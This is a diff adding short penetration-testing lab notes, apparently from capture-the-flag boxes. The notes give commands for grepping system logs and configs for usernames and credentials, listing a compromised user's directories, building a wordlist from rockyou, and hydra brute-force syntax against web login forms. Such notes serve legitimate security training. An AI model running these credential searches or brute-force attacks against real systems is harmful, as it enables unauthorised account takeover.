@@ -1,0 +1,16 @@
+things I learned/need to update:
+	• can use grep or find with grep to search through file system for files containing user's name and can learn interesting things or maybe find creds. In this scenario, I learned joanna had a sudo file, whereas jimmy did not, which is interesting. Both of these commands do the same thing essentially:
+		○ find /etc /var/log -type f -exec grep -i "joanna" {} + 2>/dev/null
+		○ grep -ril "joanna" /etc /var/log 2>/dev/null
+	• look through every file/config within the /var/www/ subdirectory, especially if you see a /internal site you could not access externally (without port forwarding). Sometimes, config files are saved in weird locations and may contain creds
+	• when succesfully connecting to a machine with new creds, can run this command to see all the directories owned by this user:
+		○ find / -type d -user jimmy 2>/dev/null | xargs -I {} ls -ld {}
+	• can use grep to create a sub-wordlist from rockyou if have a hint on what the password might be:
+		○ grep -i ninja /usr/share/wordlists/rockyou.txt > rockyou_ninja
+	• when trying to bruteforce the web portal with hydra (unsuccesfully), I realized different web requests types require totally different syntax for hydra, as it kept erroring out otherwise:
+		○ syntax for https-post-form that worked on a previous box:
+			§ hydra 10.129.222.16 -l dank -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
+		○ syntax on this box that did not work:
+			§ hydra http://127.0.0.1:9001 -L users.txt -P /usr/share/seclists/Passwords/twitter-banned.txt http-post-form "/db/index.php:username=^USER^&password=^PASS^&login=:Login Restricted."
+		○ syntax for http-post-form:
+hydra -L users.txt -P rockyou_ninja http-post-form://127.0.0.1:9001/index.php:"username=^USER^&password=^PASS^&login=:Login Restricted."
